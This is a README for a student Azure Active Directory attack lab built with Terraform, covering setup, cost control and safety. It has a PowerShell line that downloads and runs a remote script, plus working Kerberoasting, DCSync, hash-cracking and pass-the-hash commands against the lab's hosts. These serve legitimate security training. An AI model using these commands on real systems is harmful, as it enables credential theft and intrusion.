# Azure AD attack range (Terraform)

Stands up an isolated VNet with a **DC (10.10.10.10)**, a **domain member
(10.10.10.20)**, and an **Ubuntu attacker (10.10.10.50)**. NSG allows RDP/SSH
**from your IP only**. A budget alert guards your student credit.

Terraform builds the **infrastructure**; you do the **AD config** by hand after
apply (promote the DC, join the member, seed the vulns). Automating that with
custom-script extensions is a good next upgrade.

## Prerequisites

- An **Azure for Students** subscription ($100 credit, no card).
- **Azure CLI** (`az`) and **Terraform** installed.
- `az login` (pick your student subscription if you have more than one:
  `az account set --subscription "<name>"`).

## Deploy

```bash
cd azure
cp terraform.tfvars.example terraform.tfvars   # then edit it (password, your IP, email, month-start)
terraform init
terraform plan        # review! this creates billable VMs
terraform apply
```
Outputs print the public IPs.

## Configure AD (one-time, by hand)

1. **RDP to `dc_public_ip`** (user `labadmin`, your password). In PowerShell as admin:
   ```powershell
   Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
   Install-ADDSForest -DomainName "lab.local" -InstallDNS -Force   # reboots
   ```
2. **RDP to `member_public_ip`**, set DNS to the DC and join the domain:
   ```powershell
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10
   Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
   ```
3. **Seed the vulnerabilities** on the DC (PowerShell as admin):
   ```powershell
   IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/WaterExecute/vulnerable-AD/master/vulnad.ps1"))
   Invoke-VulnAD -UsersLimit 50 -DomainName "lab.local"
   ```
   (If that fork moves, search "vulnerable-AD github" — several maintained forks.)

## Attack (from the Ubuntu box)

```bash
ssh labadmin@<attacker_public_ip>
sudo apt update && sudo apt install -y python3-impacket netexec hashcat
# Kerberoasting
impacket-GetUserSPNs lab.local/lowpriv:'Password123' -dc-ip 10.10.10.10 -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash rockyou.txt
# DCSync
impacket-secretsdump lab.local/dcsyncuser:'Password123'@10.10.10.10
# Lateral movement (the part your laptop couldn't do): hop DC -> MEMBER01
nxc smb 10.10.10.20 -u admin -H <ntlm-hash>
impacket-psexec -hashes :<ntlm-hash> admin@10.10.10.20
```
(See `../virtualbox/single-dc-lab.md` for the full attack reference — same commands.)

## Cost control (do this every time)

- **Stop (deallocate) the VMs when you're done** — otherwise they bill while idle:
  ```bash
  az vm deallocate --ids $(az vm list -g adlab-rg --query "[].id" -o tsv)
  ```
  Shutting down *inside* Windows does NOT stop billing — you must deallocate.
- Start them again next session:
  ```bash
  az vm start --ids $(az vm list -g adlab-rg --query "[].id" -o tsv)
  ```
- **Full teardown** when you're done with the lab:
  ```bash
  terraform destroy
  ```

## Safety

The DC is intentionally vulnerable. The NSG is locked to `var.my_ip` — **keep it
that way, never widen RDP/SMB to the internet.** If your home IP changes, update
`my_ip` and `terraform apply`.
